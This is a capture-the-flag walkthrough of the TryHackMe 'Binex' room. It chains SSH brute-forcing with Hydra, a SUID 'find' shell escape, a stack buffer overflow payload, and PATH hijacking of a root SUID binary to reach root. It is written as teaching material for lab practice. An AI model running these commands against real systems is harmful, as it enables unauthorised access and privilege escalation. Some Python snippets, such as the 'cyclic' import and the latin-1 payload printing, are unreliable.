# Binex

**Platform:** TryHackMe
**Category:** Binary Exploitation / Privilege Escalation
**Difficulty:** Hard

---

## Overview

Binex is a Linux privilege escalation room that chains three distinct binary exploitation techniques into a full root compromise. Starting from an initial SMB enumeration to find a valid login, you escalate through three separate users — each requiring a different exploitation method:

1. **SUID exploitation** — abuse a SUID binary owned by `des` using GTFOBins
2. **Buffer overflow** — exploit a vulnerable binary owned by `kel` using GDB
3. **PATH manipulation** — exploit a SUID binary owned by `root` that calls an external command unsafely

Each stage is independent and teaches a distinct privilege escalation technique.

---

## Enumeration

### Nmap

```bash
nmap -sV -sC -A TARGET_IP
```

Key open ports:
- **139 / 445** — SMB (Samba)
- **22** — SSH

### SMB Enumeration with enum4linux

```bash
enum4linux -a TARGET_IP
```

Key information gathered:
- Valid usernames in RID range 1000–1003
- The hint indicates that the **longest username** in the RID range has an insecure (guessable) password

```bash
enum4linux -U TARGET_IP | grep "user:"
```

Users identified: `tryhackme`, `des`, `kel`

### Password Attack on the Initial User

The longest username (`tryhackme`) has a weak password. Use Hydra against SSH:

```bash
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
```

Once the password is recovered, SSH in as `tryhackme`:

```bash
ssh tryhackme@TARGET_IP
```

---

## Stage 1: SUID Exploitation → User `des`

### Find SUID Binaries

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

A SUID binary owned by `des` is identified: `/usr/bin/find`

The `find` binary is owned by `des` and has the SUID bit set. Running it executes as `des`.

### Exploit via GTFOBins

GTFOBins documents how to abuse `find` with SUID to get a shell:

```bash
find . -exec /bin/sh -p \; -quit
```

The `-p` flag preserves the effective UID from the SUID bit — this spawns a shell running as `des`.

Confirm:
```bash
whoami
# des
```

Retrieve the flag for `des`:
```bash
cat /home/des/flag.txt
```

---

## Stage 2: Buffer Overflow → User `kel`

### Find the Vulnerable Binary

From the `des` shell, look for binaries owned by `kel` with SUID set:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

A binary owned by `kel` with SUID is identified — commonly named `bof` (buffer overflow).

### Analyse the Binary with GDB

```bash
gdb /path/to/bof
```

#### Determine the Offset

Find the offset at which the return address is overwritten. Use a cyclic pattern:

**Using Python:**
```bash
python3 -c "import cyclic; print(cyclic.cyclic(200))"
# or use pwndbg/peda cyclic generation
```

**In GDB:**
```bash
(gdb) run $(python3 -c "print('A' * 200)")
```

When the binary crashes, read the value in EIP/RIP to determine the exact offset.

Alternatively, use a De Bruijn sequence:

```bash
python3 -c "print('Aa0Aa1Aa2Aa3Aa4Aa5...')"  # pattern_create equivalent
```

Then in GDB:
```bash
(gdb) info registers eip
```

Use the EIP value to calculate the exact offset.

#### Find the Return Address

Identify the address to overwrite EIP with. The goal is to return to a function or address that gives a shell running as `kel`.

If the binary has a function that spawns a shell (e.g. a `win()` function):

```bash
(gdb) info functions
(gdb) p win        # get the address
```

If no such function exists, use ret2libc:
- Find `system()` address in libc
- Find `/bin/sh` string in libc
- Construct the payload: padding + system() address + exit() address + /bin/sh address

#### Craft and Run the Exploit

```bash
/path/to/bof $(python3 -c "print('A' * OFFSET + 'BBBB')")
```

Replace `'BBBB'` with the little-endian packed return address.

**Python payload example:**
```python
import struct
offset = 136   # replace with actual offset
ret_addr = 0xdeadbeef   # replace with actual target address
payload = b"A" * offset + struct.pack("<I", ret_addr)
print(payload.decode('latin-1'))
```

Run:
```bash
/path/to/bof $(python3 exploit.py)
```

A shell spawning as `kel` confirms success.

```bash
whoami
# kel
```

Retrieve the flag:
```bash
cat /home/kel/flag.txt
```

---

## Stage 3: PATH Manipulation → Root

### Find the Root SUID Binary

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

A binary owned by `root` with SUID is identified. This binary calls an external command (e.g. `ps`, `ls`, or a custom command) without using its full absolute path — making it vulnerable to PATH manipulation.

### Identify the External Command

Use `strings` to find which external command the binary calls:

```bash
strings /path/to/suid_binary
```

Look for a command called by name without a full path (e.g. just `ps` instead of `/bin/ps`).

### Create a Malicious Version of the Command

Create a script in `/tmp` (or any writable directory) with the same name as the vulnerable command:

```bash
cd /tmp
echo '/bin/bash -p' > ps      # replace 'ps' with the actual command name
chmod +x ps
```

The `-p` flag prevents bash from dropping the elevated (root) SUID privileges.

### Prepend `/tmp` to PATH

```bash
export PATH=/tmp:$PATH
```

Now when the SUID binary calls `ps` (or whatever the command is), it finds our malicious version in `/tmp` first.

### Execute the SUID Binary

```bash
/path/to/suid_binary
```

A root shell spawns.

```bash
whoami
# root
```

Retrieve the root flag:
```bash
cat /root/root.txt
```

---

## Key Commands Summary

```bash
# Enumeration
nmap -sV -sC -A TARGET_IP
enum4linux -a TARGET_IP
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP

# Find all SUID binaries
find / -type f -perm -04000 -ls 2>/dev/null

# Stage 1: SUID find exploitation
find . -exec /bin/sh -p \; -quit

# Stage 2: Buffer overflow analysis in GDB
gdb ./bof
(gdb) run $(python3 -c "print('A' * 200)")
(gdb) info registers eip
(gdb) info functions

# Stage 3: PATH manipulation
cd /tmp
echo '/bin/bash -p' > <command_name>
chmod +x <command_name>
export PATH=/tmp:$PATH
/path/to/suid_binary
```

---

## Important Terminology

| Term | Meaning |
|------|---------|
| SUID | Set User ID — file permission bit causing a binary to run as its owner, not the caller |
| Buffer overflow | Writing more data than a buffer can hold, overwriting adjacent memory including the return address |
| EIP | Extended Instruction Pointer — register holding the address of the next instruction to execute |
| Return address | The memory address a function returns to after execution — the target of buffer overflow attacks |
| PATH manipulation | Adding an attacker-controlled directory early in `$PATH` so a called command name resolves to a malicious binary |
| GTFOBins | A curated list of Unix binaries that can be abused for privilege escalation, shell escape, or file operations |
| De Bruijn / cyclic pattern | A sequence used to precisely calculate the buffer offset that overwrites EIP |
| ret2libc | Return-to-libc attack — overwrites EIP with the address of `system()` in libc to execute `/bin/sh` |
| enum4linux | Linux tool for enumerating information from Windows/Samba systems over SMB |

---

## Workflow / Process

```
Nmap scan → SMB open (445) + SSH (22)
        |
        v
enum4linux → discover users: tryhackme, des, kel
Hint: longest username has weak password
        |
        v
Hydra brute force SSH → recover tryhackme credentials
SSH in as tryhackme
        |
        v
find / -perm -04000 → identify SUID binaries
        |
        v
Stage 1: /usr/bin/find owned by des (SUID)
  → GTFOBins: find . -exec /bin/sh -p \; -quit
  → Shell as des → des flag
        |
        v
Stage 2: bof binary owned by kel (SUID)
  → GDB analysis → find offset and return address
  → Craft buffer overflow payload
  → Shell as kel → kel flag
        |
        v
Stage 3: SUID binary owned by root calls external command
  → strings → identify unsafely called command
  → Create malicious version in /tmp
  → Prepend /tmp to PATH
  → Execute SUID binary → root shell → root flag
```

---

## Real-World Relevance

- SUID binary exploitation is one of the most common Linux privilege escalation paths — any SUID binary listed on GTFOBins is a privilege escalation vector on any system where it is set
- Buffer overflows in compiled binaries remain relevant in CTFs and in legacy, embedded, and IoT software where modern mitigations (ASLR, NX) may be absent
- PATH manipulation is exploited when a privileged binary calls external commands by name — this appears in real-world misconfigurations, custom scripts, and cron jobs
- `find / -perm -04000` is one of the first commands run in any Linux privilege escalation engagement — it surfaces immediate escalation paths
- GTFOBins is an essential reference for any penetration tester or CTF player working on Linux systems

---

## Key Learnings

- SUID binaries run as their owner — any SUID binary owned by a privileged user and listed on GTFOBins is an immediate escalation path
- Buffer overflows overwrite the return address to redirect execution — GDB is used to find the exact offset and target address
- PATH manipulation exploits the fact that shells search `$PATH` directories in order — placing a malicious binary earlier in the path hijacks command resolution
- Binex teaches three independent techniques in sequence — each represents a distinct category of Linux privilege escalation that appears regularly in both CTFs and real engagements
- The `-p` flag in `/bin/sh` and `/bin/bash` is critical when exploiting SUID — without it, bash drops the elevated effective UID as a security measure

---

## Conclusion

Binex chains three clean, well-defined privilege escalation techniques into a single room: SUID binary abuse, buffer overflow exploitation, and PATH hijacking. Working through all three stages builds a practical foundation in Linux binary exploitation that covers the most common paths from a low-privilege user to root. The skills here — reading SUID output, using GDB for crash analysis, and understanding how PATH resolution works — are directly transferable to real-world penetration testing and CTF competitions.
